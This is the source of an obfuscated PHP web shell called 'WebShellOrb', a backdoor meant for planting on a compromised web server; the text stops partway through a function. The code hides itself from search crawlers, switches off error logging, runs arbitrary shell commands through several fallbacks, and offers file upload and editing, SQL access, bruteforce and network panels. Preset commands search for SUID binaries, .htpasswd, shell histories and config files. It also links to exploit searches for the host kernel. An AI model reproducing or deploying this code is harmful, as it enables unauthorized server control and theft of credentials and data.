<?php
${"GLOBALS"}["jehnwkvhq"] = "default_action";
${"GLOBALS"}["jbzeoab"] = "bind_port_p";
${"GLOBALS"}["rnphbwgqyad"] = "t";
${"GLOBALS"}["eelpcfsuym"] = "w";
${"GLOBALS"}["kmiihcqpanrs"] = "file";
${"GLOBALS"}["gletwnspjntd"] = "title";
${"GLOBALS"}["dncwbwlrbd"] = "tbls_res";
${"GLOBALS"}["xrdbnxfmvt"] = "value";
${"GLOBALS"}["txyjmywp"] = "table";
${"GLOBALS"}["amehtg"] = "columns";
${"GLOBALS"}["sdigtdgih"] = "head";
${"GLOBALS"}["lwqrio"] = "sql";
${"GLOBALS"}["lfljrdmc"] = "create";
${"GLOBALS"}["lhydmmywwn"] = "str";
${"GLOBALS"}["bopmwejgirf"] = "db";
${"GLOBALS"}["omanxfropl"] = "line";
${"GLOBALS"}["nnwtcnvv"] = "server";
${"GLOBALS"}["civkgkkc"] = "attempts";
${"GLOBALS"}["nscqaqn"] = "success";
${"GLOBALS"}["bdrlwjttk"] = "login";
${"GLOBALS"}["icduirvc"] = "pass";
${"GLOBALS"}["ymhnnp"] = "res";
${"GLOBALS"}["nhegyujkbg"] = "port";
${"GLOBALS"}["qelasgmoq"] = "ip";
${"GLOBALS"}["srhpuno"] = "len";
${"GLOBALS"}["rifohoju"] = "time";
${"GLOBALS"}["bgbndglw"] = "perms";
${"GLOBALS"}["tbrhqbi"] = "fp";
${"GLOBALS"}["gigsmqyowb"] = "paths";
${"GLOBALS"}["dyvthet"] = "stringTools";
${"GLOBALS"}["mwpoytmwus"] = "r";
${"GLOBALS"}["gayaio"] = "l";
${"GLOBALS"}["slzbugds"] = "b";
${"GLOBALS"}["cxfbyfxajt"] = "a";
${"GLOBALS"}["punnqnswy"] = "gr";
${"GLOBALS"}["zppzcsfgo"] = "ow";
${"GLOBALS"}["qanhuo"] = "dirContent";
${"GLOBALS"}["xzocqroestsp"] = "dirs";
${"GLOBALS"}["khtkbtbcp"] = "match";
${"GLOBALS"}["wxflrkghg"] = "sort";
${"GLOBALS"}["oocwabo"] = "key";
${"GLOBALS"}["xqjcyjffi"] = "iterator";
${"GLOBALS"}["aihxtguj"] = "h";
${"GLOBALS"}["smcbgcyi"] = "d";
${"GLOBALS"}["sbuwwkozt"] = "c";
${"GLOBALS"}["vxhdoihqlkd"] = "type";
${"GLOBALS"}["ecbcmiybue"] = "tmp";
${"GLOBALS"}["phgjytx"] = "danger";
${"GLOBALS"}["mercgmdwe"] = "temp";
${"GLOBALS"}["onmdrx"] = "n";
${"GLOBALS"}["yluxecll"] = "files";
${"GLOBALS"}["rbasqp"] = "filename";
${"GLOBALS"}["qubwkb"] = "dh";
${"GLOBALS"}["leuwumt"] = "dir";
${"GLOBALS"}["vwhnmvbzmuqd"] = "p";
${"GLOBALS"}["uopupgy"] = "s";
${"GLOBALS"}["sberlg"] = "f";
${"GLOBALS"}["fnkkdtgr"] = "in";
${"GLOBALS"}["qdurqmqjmbr"] = "out";
${"GLOBALS"}["brvjme"] = "is_writable";
${"GLOBALS"}["plyulhiuro"] = "freeSpace";
${"GLOBALS"}["cblwsfsrxdw"] = "drive";
${"GLOBALS"}["ofhwsmmm"] = "drives";
${"GLOBALS"}["vvdxmjbgec"] = "v";
${"GLOBALS"}["wwtfgcddf"] = "menu";
${"GLOBALS"}["fskqowyovpk"] = "m";
${"GLOBALS"}["bdmqwqvfqn"] = "item";
${"GLOBALS"}["mgvkxgcmofyr"] = "opt_charsets";
${"GLOBALS"}["ffswlhab"] = "path";
${"GLOBALS"}["rxgtddszwqnr"] = "j";
${"GLOBALS"}["clkuyojj"] = "i";
${"GLOBALS"}["qumrcez"] = "cwd_links";
${"GLOBALS"}["gkjyrzxng"] = "uid";
${"GLOBALS"}["hxhfbflhzlt"] = "user";
${"GLOBALS"}["uyrzfubjl"] = "group";
${"GLOBALS"}["elkyxmiyu"] = "gid";
${"GLOBALS"}["ccoxzyjv"] = "release";
${"GLOBALS"}["bxyoytprd"] = "explink";
${"GLOBALS"}["vgkonizq"] = "kernel";
${"GLOBALS"}["mtmcgbuxstj"] = "totalSpace";
${"GLOBALS"}["uolbyjcowuum"] = "aliases";
${"GLOBALS"}["rqlrvrqjdye"] = "cwd";
${"GLOBALS"}["ppyxsbssm"] = "home_cwd";
${"GLOBALS"}["cpxsnhfrvxnr"] = "safe_mode";
${"GLOBALS"}["tngplbofyfxj"] = "os";
$slswzwwiy = "os";
$qvuswnnljk = "cwd";
${"GLOBALS"}["oqvryxe"] = "k";
${"GLOBALS"}["egcnymujkiu"] = "array";
${"GLOBALS"}["dbdznjgxv"] = "userAgents";
${"GLOBALS"}["cdkparndoqp"] = "auth_pass";
${"GLOBALS"}["wqnrzv"] = "default_use_ajax";
${"GLOBALS"}["cnreqxxxyx"] = "color";
${"GLOBALS"}["vnvuep"] = "os";
error_reporting(0);
$rcnyvpgwp = "default_action";
${${"GLOBALS"}["cnreqxxxyx"]} = "#df5";
${$rcnyvpgwp} = "FilesMan";
${${"GLOBALS"}["wqnrzv"]} = true;
${"GLOBALS"}["hxwowixkcah"] = "disable_functions";
${"GLOBALS"}["oecyizwdg"] = "default_charset";
${${"GLOBALS"}["oecyizwdg"]} = "Windows-1251";
${${"GLOBALS"}["cdkparndoqp"]} = "";
if (!empty($_SERVER["HTTP_USER_AGENT"])) {
    $funwst = "userAgents";
    ${$funwst} = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
    if (preg_match("/" . implode("|", ${${"GLOBALS"}["dbdznjgxv"]}) . "/i", $_SERVER["HTTP_USER_AGENT"])) {
        header("HTTP/1.0 404 Not Found");
        exit;
    }
}
@ini_set("error_log", NULL);
@ini_set("log_errors", 0);
@ini_set("max_execution_time", 0);
$jkanbtmrlf = "auth_pass";
@set_time_limit(0);
$iqvdvclroyby = "aliases";
@define("WebShellOrb_VERSION", "2.6");
if (get_magic_quotes_gpc()) {
    function WebShellOrbstripslashes($array)
    {
        ${"GLOBALS"}["jdcuurkq"] = "array";
        $ziszkiem = "array";
        return is_array(${${"GLOBALS"}["egcnymujkiu"]}) ? array_map("WebShellOrbstripslashes", ${$ziszkiem}) : stripslashes(${${"GLOBALS"}["jdcuurkq"]});
    }
    $_POST = WebShellOrbstripslashes($_POST);
    $_COOKIE = WebShellOrbstripslashes($_COOKIE);
}
function WebShellOrbLogin()
{
    die("<pre align=center><form method=post>Password: <input type=password name=pass><input type=submit value='>>'></form></pre>");
}
function WebShellOrbsetcookie($k, $v)
{
    ${"GLOBALS"}["inbcfdml"] = "k";
    $gltqybwss = "v";
    $_COOKIE[${${"GLOBALS"}["inbcfdml"]}] = ${$gltqybwss};
    ${"GLOBALS"}["liyrzggwi"] = "v";
    setcookie(${${"GLOBALS"}["oqvryxe"]}, ${${"GLOBALS"}["liyrzggwi"]});
}
if (!empty(${$jkanbtmrlf})) {
    $mewlffwp = "auth_pass";
    ${"GLOBALS"}["ccrrecjgmg"] = "auth_pass";
    ${"GLOBALS"}["uwlnxnqkvyx"] = "auth_pass";
    if (isset($_POST["pass"]) && md5($_POST["pass"]) == ${${"GLOBALS"}["uwlnxnqkvyx"]}) {
        WebShellOrbsetcookie(md5($_SERVER["HTTP_HOST"]), ${$mewlffwp});
    }
    if (!isset($_COOKIE[md5($_SERVER["HTTP_HOST"])]) || $_COOKIE[md5($_SERVER["HTTP_HOST"])] != ${${"GLOBALS"}["ccrrecjgmg"]}) {
        WebShellOrbLogin();
    }
}
if (strtolower(substr(PHP_OS, 0, 3)) == "win") {
    ${${"GLOBALS"}["vnvuep"]} = "win";
} else {
    ${${"GLOBALS"}["tngplbofyfxj"]} = "nix";
}
${${"GLOBALS"}["cpxsnhfrvxnr"]} = @ini_get("safe_mode");
if (!${${"GLOBALS"}["cpxsnhfrvxnr"]}) {
    error_reporting(0);
}
${${"GLOBALS"}["hxwowixkcah"]} = @ini_get("disable_functions");
${${"GLOBALS"}["ppyxsbssm"]} = @getcwd();
if (isset($_POST["c"])) {
    @chdir($_POST["c"]);
}
${${"GLOBALS"}["rqlrvrqjdye"]} = @getcwd();
if (${$slswzwwiy} == "win") {
    ${${"GLOBALS"}["ppyxsbssm"]} = str_replace("\\", "/", ${${"GLOBALS"}["ppyxsbssm"]});
    $sjfvibvmk = "cwd";
    ${$sjfvibvmk} = str_replace("\\", "/", ${${"GLOBALS"}["rqlrvrqjdye"]});
}
${"GLOBALS"}["wmcgcguq"] = "os";
if (${$qvuswnnljk}[strlen(${${"GLOBALS"}["rqlrvrqjdye"]}) - 1] != "/") {
    ${${"GLOBALS"}["rqlrvrqjdye"]} .= "/";
}
if (!isset($_COOKIE[md5($_SERVER["HTTP_HOST"]) . "ajax"])) {
    $_COOKIE[md5($_SERVER["HTTP_HOST"]) . "ajax"] = (bool) ${${"GLOBALS"}["wqnrzv"]};
}
if (${${"GLOBALS"}["wmcgcguq"]} == "win") {
    ${${"GLOBALS"}["uolbyjcowuum"]} = array("List Directory" => "dir", "Find index.php in current dir" => "dir /s /w /b index.php", "Find *config*.php in current dir" => "dir /s /w /b *config*.php", "Show active connections" => "netstat -an", "Show running services" => "net start", "User accounts" => "net user", "Show computers" => "net view", "ARP Table" => "arp -a", "IP Configuration" => "ipconfig /all");
} else {
    ${$iqvdvclroyby} = array("List dir" => "ls -lha", "list file attributes on a Linux second extended file system" => "lsattr -va", "show opened ports" => "netstat -an | grep -i listen", "process status" => "ps aux", "Find" => "", "find all suid" => "find / -type f -perm -04000 -ls", "find suid in current dir" => "find . -type f -perm -04000 -ls", "find all sgid" => "find / -type f -perm -02000 -ls", "find sgid files in current dir" => "find . -type f -perm -02000 -ls", "find config.inc.php" => "find / -type f -name config.inc.php", "find config*" => "find / -type f -name \"config*\"", "find config* in current dir" => "find . -type f -name \"config*\"", "find all writable folders and files" => "find / -perm -2 -ls", "find all writable folders and files in current dir" => "find . -perm -2 -ls", "find all service.pwd" => "find / -type f -name service.pwd", "find service.pwd files in current dir" => "find . -type f -name service.pwd", "find all .htpasswd" => "find / -type f -name .htpasswd", "find .htpasswd files in current dir" => "find . -type f -name .htpasswd", "find all .bash_history" => "find / -type f -name .bash_history", "find .bash_history files in current dir" => "find . -type f -name .bash_history", "find all .fetchmailrc" => "find / -type f -name .fetchmailrc", "find .fetchmailrc files in current dir" => "find . -type f -name .fetchmailrc", "Locate" => "", "locate httpd.conf" => "locate httpd.conf", "locate vhosts.conf" => "locate vhosts.conf", "locate proftpd.conf" => "locate proftpd.conf", "locate psybnc.conf" => "locate psybnc.conf", "locate my.conf" => "locate my.conf", "locate admin.php" => "locate admin.php", "locate cfg.php" => "locate cfg.php", "locate conf.php" => "locate conf.php", "locate config.dat" => "locate config.dat", "locate config.php" => "locate config.php", "locate config.inc" => "locate config.inc", "locate config.inc.php" => "locate config.inc.php", "locate config.default.php" => "locate config.default.php", "locate config*" => "locate config", "locate .conf" => "locate '.conf'", "locate .pwd" => "locate '.pwd'", "locate .sql" => "locate '.sql'", "locate .htpasswd" => "locate '.htpasswd'", "locate .bash_history" => "locate '.bash_history'", "locate .mysql_history" => "locate '.mysql_history'", "locate .fetchmailrc" => "locate '.fetchmailrc'", "locate backup" => "locate backup", "locate dump" => "locate dump", "locate priv" => "locate priv");
}
function WebShellOrbHeader()
{
    ${"GLOBALS"}["lfcdhxiqrjuc"] = "freeSpace";
    $cvyfemar = "i";
    $gigkkylcom = "v";
    ${"GLOBALS"}["rtzgviw"] = "item";
    $jeuwvfj = "path";
    $syynptc = "uid";
    $unibgzq = "release";
    ${"GLOBALS"}["qhgnljws"] = "totalSpace";
    if (empty($_POST["charset"])) {
        $_POST["charset"] = $GLOBALS["default_charset"];
    }
    ${"GLOBALS"}["paallywki"] = "explink";
    $unjshhsygx = "item";
    ${"GLOBALS"}["rrsayeov"] = "k";
    ${"GLOBALS"}["tlmqysbj"] = "user";
    $mzcbhnv = "n";
    global $color;
    $ylknujmswar = "charsets";
    $fnmpbhsrxkxs = "release";
    echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST["charset"] . "'><title>" . $_SERVER["HTTP_HOST"] . " - WebShellOrb " . WebShellOrb_VERSION . "</title>\n<style>\nbody{background-color:#444;color:#e1e1e1;}\nbody,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1; }\ntable.info{ color:#fff;background-color:#222; }\nspan,h1,a{ color: {$color} !important; }\nspan{ font-weight: bolder; }\nh1{ border-left:5px solid {$color};padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px; }\ndiv.content{ padding: 5px;margin-left:5px;background-color:#333; }\na{ text-decoration:none; }\na:hover{ text-decoration:underline; }\n.ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }\n.bigarea{ width:100%;height:300px; }\ninput,textarea,select{ margin:0;color:#fff;background-color:#555;border:1px solid {$color}; font: 9pt Monospace,'Courier New'; }\nform{ margin:0px; }\n#toolsTbl{ text-align:center; }\n.toolsInp{ width: 300px }\n.main th{text-align:left;background-color:#5e5e5e;}\n.main tr:hover{background-color:#5e5e5e}\n.l1{background-color:#444}\n.l2{background-color:#333}\npre{font-family:Courier,Monospace;}\n</style>\n<script>\n    var c_ = '" . htmlspecialchars($GLOBALS["cwd"]) . "';\n    var a_ = '" . htmlspecialchars(@$_POST["a"]) . "'\n    var charset_ = '" . htmlspecialchars(@$_POST["charset"]) . "';\n    var p1_ = '" . (strpos(@$_POST["p1"], "\n") !== false ? "" : htmlspecialchars($_POST["p1"], ENT_QUOTES)) . "';\n    var p2_ = '" . (strpos(@$_POST["p2"], "\n") !== false ? "" : htmlspecialchars($_POST["p2"], ENT_QUOTES)) . "';\n    var p3_ = '" . (strpos(@$_POST["p3"], "\n") !== false ? "" : htmlspecialchars($_POST["p3"], ENT_QUOTES)) . "';\n    var d = document;\n\tfunction set(a,c,p1,p2,p3,charset) {\n\t\tif(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;\n\t\tif(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;\n\t\tif(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;\n\t\tif(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;\n\t\tif(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;\n\t\tif(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;\n\t\t//if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;\n\t}\n\tfunction g(a,c,p1,p2,p3,charset) {\n\t\tset(a,c,p1,p2,p3,charset);\n\t\td.mf.submit();\n\t}\n\tfunction a(a,c,p1,p2,p3,charset) {\n\t\tset(a,c,p1,p2,p3,charset);\n\t\tvar params = 'ajax=true';\n\t\tfor(i=0;i<d.mf.elements.length;i++)\n\t\t\tparams += '&'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value);\n\t\tsr('" . addslashes($_SERVER["REQUEST_URI"]) . "', params);\n\t}\n\tfunction sr(url, params) {\n\t\tif (window.XMLHttpRequest)\n\t\t\treq = new XMLHttpRequest();\n\t\telse if (window.ActiveXObject)\n\t\t\treq = new ActiveXObject('Microsoft.XMLHTTP');\n        if (req) {\n            req.onreadystatechange = processReqChange;\n            req.open('POST', url, true);\n            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');\n            req.send(params);\n        }\n\t}\n\tfunction processReqChange() {\n\t\tif( (req.readyState == 4) )\n\t\t\tif(req.status == 200) {\n\t\t\t\tvar reg = new RegExp(\"(\\\\d+)([\\\\S\\\\s]*)\", 'm');\n\t\t\t\tvar arr=reg.exec(req.responseText);\n\t\t\t\teval(arr[2].substr(0, arr[1]));\n\t\t\t} else alert('Request error!');\n\t}\n</script>\n<head><body><div style='position:absolute;width:100%;background-color:#444;top:0;left:0;'>\n<form method=post name=mf style='display:none;'>\n<input type=hidden name=a>\n<input type=hidden name=c>\n<input type=hidden name=p1>\n<input type=hidden name=p2>\n<input type=hidden name=p3>\n<input type=hidden name=charset>\n</form>";
    $xfernkifiv = "kernel";
    ${${"GLOBALS"}["lfcdhxiqrjuc"]} = @diskfreespace($GLOBALS["cwd"]);
    ${${"GLOBALS"}["mtmcgbuxstj"]} = @disk_total_space($GLOBALS["cwd"]);
    ${${"GLOBALS"}["qhgnljws"]} = ${${"GLOBALS"}["mtmcgbuxstj"]} ? ${${"GLOBALS"}["mtmcgbuxstj"]} : 1;
    $wjslkgig = "charsets";
    ${$fnmpbhsrxkxs} = @php_uname("r");
    ${$xfernkifiv} = @php_uname("s");
    ${"GLOBALS"}["devrcywexce"] = "i";
    ${${"GLOBALS"}["paallywki"]} = "https://www.exploit-db.com/search?q=";
    if (strpos("Linux", ${${"GLOBALS"}["vgkonizq"]}) !== false) {
        ${${"GLOBALS"}["bxyoytprd"]} .= urlencode("Linux Kernel " . substr(${${"GLOBALS"}["ccoxzyjv"]}, 0, 6));
    } else {
        ${${"GLOBALS"}["bxyoytprd"]} .= urlencode(${${"GLOBALS"}["vgkonizq"]} . " " . substr(${$unibgzq}, 0, 3));
    }
    $yuriqttm = "path";
    $dapwvlq = "n";
    ${"GLOBALS"}["cdovfzfgp"] = "menu";
    if (!function_exists("posix_getegid")) {
        ${"GLOBALS"}["jvxsiqqu"] = "uid";
        $aiyfiiwq = "user";
        ${$aiyfiiwq} = @get_current_user();
        ${${"GLOBALS"}["jvxsiqqu"]} = @getmyuid();
        ${${"GLOBALS"}["elkyxmiyu"]} = @getmygid();
        ${${"GLOBALS"}["uyrzfubjl"]} = "?";
    } else {
        $hnryuak = "gid";
        $lzwmbumx = "uid";
        ${$lzwmbumx} = @posix_getpwuid(posix_geteuid());
        ${$hnryuak} = @posix_getgrgid(posix_getegid());
        ${"GLOBALS"}["tufvwq"] = "gid";
        ${"GLOBALS"}["mejxibh"] = "gid";
        ${${"GLOBALS"}["hxhfbflhzlt"]} = ${${"GLOBALS"}["gkjyrzxng"]}["name"];
        ${${"GLOBALS"}["gkjyrzxng"]} = ${${"GLOBALS"}["gkjyrzxng"]}["uid"];
        ${${"GLOBALS"}["uyrzfubjl"]} = ${${"GLOBALS"}["elkyxmiyu"]}["name"];
        ${${"GLOBALS"}["tufvwq"]} = ${${"GLOBALS"}["mejxibh"]}["gid"];
    }
    ${"GLOBALS"}["ykiemhno"] = "m";
    ${${"GLOBALS"}["qumrcez"]} = "";
    ${$yuriqttm} = explode("/", $GLOBALS["cwd"]);
    $yxdvqicqjzi = "m";
    ${"GLOBALS"}["ietcukn"] = "cwd_links";
    ${$dapwvlq} = count(${$jeuwvfj});
    for (${${"GLOBALS"}["devrcywexce"]} = 0; ${$cvyfemar} < ${$mzcbhnv} - 1; ${${"GLOBALS"}["clkuyojj"]}++) {
        ${"GLOBALS"}["urffjmdujbs"] = "cwd_links";
        $nubocyjtuqn = "j";
        ${"GLOBALS"}["guamecwi"] = "j";
        $iyjeuqvfrl = "cwd_links";
        ${${"GLOBALS"}["qumrcez"]} .= "<a href='#' onclick='g(\"FilesMan\",\"";
        ${"GLOBALS"}["pzisplggic"] = "i";
        for (${$nubocyjtuqn} = 0; ${${"GLOBALS"}["rxgtddszwqnr"]} <= ${${"GLOBALS"}["clkuyojj"]}; ${${"GLOBALS"}["rxgtddszwqnr"]}++) {
            ${${"GLOBALS"}["urffjmdujbs"]} .= ${${"GLOBALS"}["ffswlhab"]}[${${"GLOBALS"}["guamecwi"]}] . "/";
        }
        ${$iyjeuqvfrl} .= "\")'>" . ${${"GLOBALS"}["ffswlhab"]}[${${"GLOBALS"}["pzisplggic"]}] . "/</a>";
    }
    ${$ylknujmswar} = array("UTF-8", "Windows-1251", "KOI8-R", "KOI8-U", "cp866");
    ${${"GLOBALS"}["mgvkxgcmofyr"]} = "";
    $amhhbx = "freeSpace";
    foreach (${$wjslkgig} as ${${"GLOBALS"}["rtzgviw"]}) {
        ${${"GLOBALS"}["mgvkxgcmofyr"]} .= "<option value=\"" . ${$unjshhsygx} . "\" " . ($_POST["charset"] == ${${"GLOBALS"}["bdmqwqvfqn"]} ? "selected" : "") . ">" . ${${"GLOBALS"}["bdmqwqvfqn"]} . "</option>";
    }
    ${${"GLOBALS"}["fskqowyovpk"]} = array("Sec. Info" => "SecInfo", "Files" => "FilesMan", "Console" => "Console", "Sql" => "Sql", "Php" => "Php", "String tools" => "StringTools", "Bruteforce" => "Bruteforce", "Network" => "Network");
    $fqtoyg = "drives";
    if (!empty($GLOBALS["auth_pass"])) {
        ${${"GLOBALS"}["fskqowyovpk"]}["Logout"] = "Logout";
    }
    ${$yxdvqicqjzi}["Self remove"] = "SelfRemove";
    ${${"GLOBALS"}["wwtfgcddf"]} = "";
    foreach (${${"GLOBALS"}["fskqowyovpk"]} as ${${"GLOBALS"}["oqvryxe"]} => ${${"GLOBALS"}["vvdxmjbgec"]}) {
        ${${"GLOBALS"}["cdovfzfgp"]} .= "<th width=\"" . (int) (100 / count(${${"GLOBALS"}["ykiemhno"]})) . "%\">[ <a href=\"#\" onclick=\"g('" . ${$gigkkylcom} . "',null,'','','')\">" . ${${"GLOBALS"}["rrsayeov"]} . "</a> ]</th>";
    }
    ${${"GLOBALS"}["ofhwsmmm"]} = "";
    if ($GLOBALS["os"] == "win") {
        ${"GLOBALS"}["bfeplaaxg"] = "drive";
        foreach (range("c", "z") as ${${"GLOBALS"}["bfeplaaxg"]}) {
            ${"GLOBALS"}["jilogpg"] = "drive";
            if (is_dir(${${"GLOBALS"}["cblwsfsrxdw"]} . ":\\")) {
                ${${"GLOBALS"}["ofhwsmmm"]} .= "<a href=\"#\" onclick=\"g('FilesMan','" . ${${"GLOBALS"}["cblwsfsrxdw"]} . ":/')\">[ " . ${${"GLOBALS"}["jilogpg"]} . " ]</a> ";
            }
        }
    }
    echo "<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:" . ($GLOBALS["os"] == "win" ? "<br>Drives:" : "") . "</span></td>" . "<td><nobr>" . substr(@php_uname(), 0, 120) . " </nobr><br>" . ${$syynptc} . " ( " . ${${"GLOBALS"}["tlmqysbj"]} . " ) <span>Group:</span> " . ${${"GLOBALS"}["elkyxmiyu"]} . " ( " . ${${"GLOBALS"}["uyrzfubjl"]} . " )<br>" . @phpversion() . " <span>Safe mode:</span> " . ($GLOBALS["safe_mode"] ? "<font color=red>ON</font>" : "<font color=green><b>OFF</b></font>") . " <a href=# onclick=\"g('Php',null,'','info')\">[ phpinfo ]</a> <span>Datetime:</span> " . date("Y-m-d H:i:s") . "<br>" . WebShellOrbViewSize(${${"GLOBALS"}["mtmcgbuxstj"]}) . " <span>Free:</span> " . WebShellOrbViewSize(${$amhhbx}) . " (" . (int) (${${"GLOBALS"}["plyulhiuro"]} / ${${"GLOBALS"}["mtmcgbuxstj"]} * 100) . "%)<br>" . ${${"GLOBALS"}["ietcukn"]} . " " . WebShellOrbPermsColor($GLOBALS["cwd"]) . " <a href=# onclick=\"g('FilesMan','" . $GLOBALS["home_cwd"] . "','','','')\">[ home ]</a><br>" . ${$fqtoyg} . "</td>" . "<td width=1 align=right><nobr><select onchange=\"g(null,null,null,null,null,this.value)\"><optgroup label=\"Page charset\">" . ${${"GLOBALS"}["mgvkxgcmofyr"]} . "</optgroup></select><br><span>Server IP:</span><br>" . @$_SERVER["SERVER_ADDR"] . "<br><span>Client IP:</span><br>" . $_SERVER["REMOTE_ADDR"] . "</nobr></td></tr></table>" . "<table style=\"border-top:2px solid #333;\" cellpadding=3 cellspacing=0 width=100%><tr>" . ${${"GLOBALS"}["wwtfgcddf"]} . "</tr></table><div style=\"margin:5\">";
}
function WebShellOrbFooter()
{
    ${${"GLOBALS"}["brvjme"]} = is_writable($GLOBALS["cwd"]) ? " <font color='green'>(Writeable)</font>" : " <font color=red>(Not writable)</font>";
    echo "\n</div>\n<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style='border-top:2px solid #333;border-bottom:2px solid #333;'>\n\t<tr>\n\t\t<td><form onsubmit='g(null,this.c.value,\"\");return false;'><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='" . htmlspecialchars($GLOBALS["cwd"]) . "'><input type=submit value='>>'></form></td>\n\t\t<td><form onsubmit=\"g('FilesTools',null,this.f.value);return false;\"><span>Read file:</span><br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>\n\t</tr><tr>\n\t\t<td><form onsubmit=\"g('FilesMan',null,'mkdir',this.d.value);return false;\"><span>Make dir:</span>{$is_writable}<br><input class='toolsInp' type=text name=d><input type=submit value='>>'></form></td>\n\t\t<td><form onsubmit=\"g('FilesTools',null,this.f.value,'mkfile');return false;\"><span>Make file:</span>{$is_writable}<br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>\n\t</tr><tr>\n\t\t<td><form onsubmit=\"g('Console',null,this.c.value);return false;\"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='>>'></form></td>\n\t\t<td><form method='post' ENCTYPE='multipart/form-data'>\n\t\t<input type=hidden name=a value='FilesMAn'>\n\t\t<input type=hidden name=c value='" . $GLOBALS["cwd"] . "'>\n\t\t<input type=hidden name=p1 value='uploadFile'>\n\t\t<input type=hidden name=charset value='" . (isset($_POST["charset"]) ? $_POST["charset"] : "") . "'>\n\t\t<span>Upload file:</span>{$is_writable}<br><input class='toolsInp' type=file name=f><input type=submit value='>>'></form><br  ></td>\n\t</tr></table></div></body></html>";
}
if (!function_exists("posix_getpwuid") && strpos($GLOBALS["disable_functions"], "posix_getpwuid") === false) {
    function posix_getpwuid($p)
    {
        return false;
    }
}
if (!function_exists("posix_getgrgid") && strpos($GLOBALS["disable_functions"], "posix_getgrgid") === false) {
    function posix_getgrgid($p)
    {
        return false;
    }
}
function WebShellOrbEx($in)
{
    ${${"GLOBALS"}["qdurqmqjmbr"]} = "";
    $ulvxazrw = "f";
    if (function_exists("exec")) {
        ${"GLOBALS"}["puwualher"] = "out";
        ${"GLOBALS"}["wvnfyvnwgbn"] = "out";
        ${"GLOBALS"}["yqwwmdce"] = "in";
        @exec(${${"GLOBALS"}["yqwwmdce"]}, ${${"GLOBALS"}["qdurqmqjmbr"]});
        ${${"GLOBALS"}["puwualher"]} = @join("\n", ${${"GLOBALS"}["wvnfyvnwgbn"]});
    } elseif (function_exists("passthru")) {
        ${"GLOBALS"}["ghqwlszjfk"] = "out";
        ob_start();
        ${"GLOBALS"}["toraaeaxl"] = "in";
        @passthru(${${"GLOBALS"}["toraaeaxl"]});
        ${${"GLOBALS"}["ghqwlszjfk"]} = ob_get_clean();
    } elseif (function_exists("system")) {
        ${"GLOBALS"}["matymxx"] = "in";
        ${"GLOBALS"}["vjtbwkqix"] = "out";
        ob_start();
        @system(${${"GLOBALS"}["matymxx"]});
        ${${"GLOBALS"}["vjtbwkqix"]} = ob_get_clean();
    } elseif (function_exists("shell_exec")) {
        ${"GLOBALS"}["npcgacfoo"] = "in";
        ${"GLOBALS"}["djodnntmrmsi"] = "out";
        ${${"GLOBALS"}["djodnntmrmsi"]} = shell_exec(${${"GLOBALS"}["npcgacfoo"]});
    } elseif (is_resource(${$ulvxazrw} = @popen(${${"GLOBALS"}["fnkkdtgr"]}, "r"))) {
        ${"GLOBALS"}["rghikhavtcg"] = "f";
        ${${"GLOBALS"}["qdurqmqjmbr"]} = "";
        while (!@feof(${${"GLOBALS"}["sberlg"]})) {
            ${${"GLOBALS"}["qdurqmqjmbr"]} .= fread(${${"GLOBALS"}["rghikhavtcg"]}, 1024);
        }
        $iemsnbyuveay = "f";
        pclose(${$iemsnbyuveay});
    }
    return ${${"GLOBALS"}["qdurqmqjmbr"]};
}
function WebShellOrbViewSize($s)
{
    ${"GLOBALS"}["gimekbfm"] = "s";
    ${"GLOBALS"}["cbmexkhxicy"] = "s";
    $dqglmpbjtwd = "s";
    $vamszp = "s";
    $jwevteetyqc = "s";
    $uebsygttsee = "s";
    ${"GLOBALS"}["nmpwumxsjgpa"] = "s";
    if (is_int(${${"GLOBALS"}["nmpwumxsjgpa"]})) {
        ${$vamszp} = sprintf("%u", ${$dqglmpbjtwd});
    }
    $rsztkxvkbp = "s";
    if (${${"GLOBALS"}["uopupgy"]} >= 1073741824) {
        return sprintf("%1.2f", ${${"GLOBALS"}["uopupgy"]} / 1073741824) . " GB";
    } elseif (${$uebsygttsee} >= 1048576) {
        return sprintf("%1.2f", ${$jwevteetyqc} / 1048576) . " MB";
    } elseif (${${"GLOBALS"}["gimekbfm"]} >= 1024) {
        return sprintf("%1.2f", ${${"GLOBALS"}["cbmexkhxicy"]} / 1024) . " KB";
    } else {
        return ${$rsztkxvkbp} . " B";
    }
}
function WebShellOrbPerms($p)
{
    $qwyrtxgnisf = "p";
    $lreavxykf = "i";
    $ctwfzevrci = "p";
    ${"GLOBALS"}["qtdsyeg"] = "p";
    $mhcxeci = "i";
    $auktcgubws = "p";
    $alkqtmvu = "p";
    ${"GLOBALS"}["nhlvkvrl"] = "i";
    $ilolonrsko = "p";
    $vlkybhpqjn = "p";
    ${"GLOBALS"}["idxhruzeutti"] = "p";
    ${"GLOBALS"}["kyhbiltfi"] = "p";
    ${"GLOBALS"}["ohjadiupdto"] = "i";
    $qkybts = "p";
    $iwcqbfpgngg = "p";
    ${"GLOBALS"}["olqfmkengz"] = "p";
    $jupethhvkj = "p";
    if ((${${"GLOBALS"}["vwhnmvbzmuqd"]} & 0xc000) == 0xc000) {
        ${${"GLOBALS"}["clkuyojj"]} = "s";
    } elseif ((${$auktcgubws} & 0xa000) == 0xa000) {
        ${$lreavxykf} = "l";
    } elseif ((${$alkqtmvu} & 0x8000) == 0x8000) {
        ${${"GLOBALS"}["clkuyojj"]} = "-";
